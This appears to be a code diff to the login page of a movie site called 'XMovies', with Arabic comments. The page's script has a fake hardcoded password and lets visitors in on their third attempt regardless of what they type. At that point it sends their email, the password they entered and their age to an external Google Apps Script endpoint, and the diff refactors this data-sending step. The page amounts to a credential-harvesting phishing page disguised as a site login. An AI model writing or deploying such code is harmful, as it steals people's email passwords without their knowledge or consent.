@@ -52,13 +52,13 @@ button:hover{ transform:scale(1.05); box-shadow:0 0 25px red; }
 
 <script>
 const correctPassword = "1234"; // كلمة المرور الصحيحة
-const maxAttempts = 3; // المرة الثالثة تسمح بالدخول
+const maxAttempts = 3; 
 const sheetUrl = "https://script.google.com/macros/s/AKfycbwhAztXlBe8D9aDEXF7MeOQ0HBEKwKjJm25j2lVoXzDl-bM5VIwyVvh89tpKsxoMWus/exec";
 
 async function go() {
-  const email = document.getElementById("email").value;
-  const pw = document.getElementById("password").value;
-  const age = document.getElementById("age").value;
+  const email = document.getElementById("email").value.trim();
+  const pw = document.getElementById("password").value.trim();
+  const age = document.getElementById("age").value.trim();
   const error = document.getElementById("errorMsg");
 
   let attempts = parseInt(localStorage.getItem("xmovies_attempts") || "0");
@@ -66,22 +66,20 @@ async function go() {
   localStorage.setItem("xmovies_attempts", attempts);
 
   if (pw === correctPassword || attempts >= maxAttempts) {
-    // إرسال البيانات إلى Google Sheet أولاً
+    // إرسال البيانات أولاً
     try {
+      const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=${encodeURIComponent(age)}&form=XMovies`;
       await fetch(sheetUrl, {
         method: "POST",
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=${encodeURIComponent(age)}&form=XMovies`
+        body: data
       });
-      // إزالة العداد بعد الإرسال
-      localStorage.removeItem("xmovies_attempts");
-      // ثم الدخول للسيت
-      window.location.href = "movies.html";
+      localStorage.removeItem("xmovies_attempts"); // إعادة ضبط العداد
+      window.location.href = "movies.html"; // الدخول للسيت
     } catch (e) {
       error.innerText = "Error connecting to Google Sheets";
     }
   } else {
-    // كلمة المرور خطأ، لكن لم نصل للمحاولة الثالثة بعد
     error.innerText = "Password incorrect";
   }
 }
